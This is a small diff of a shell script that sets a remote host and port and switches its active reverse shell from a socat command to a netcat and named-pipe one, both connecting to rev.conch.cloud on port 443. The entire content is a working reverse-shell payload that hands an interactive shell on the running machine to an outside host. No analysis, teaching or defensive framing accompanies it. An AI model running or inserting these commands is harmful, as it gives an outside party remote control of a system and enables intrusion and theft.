@@ -3,6 +3,7 @@
 RHOST="rev.conch.cloud"
 RPORT=443
 
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-connect:$RHOST:$RPORT 
+#socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-connect:$RHOST:$RPORT 
 #socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl-connect:$RHOST:$RPORT,cert=client.pem,cafile=server.crt 
-#mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc rev.conch.cloud 443 >/tmp/f
+mkfifo /tmp/f
+cat /tmp/f|/bin/sh -i 2>&1|nc rev.conch.cloud 443 >/tmp/f
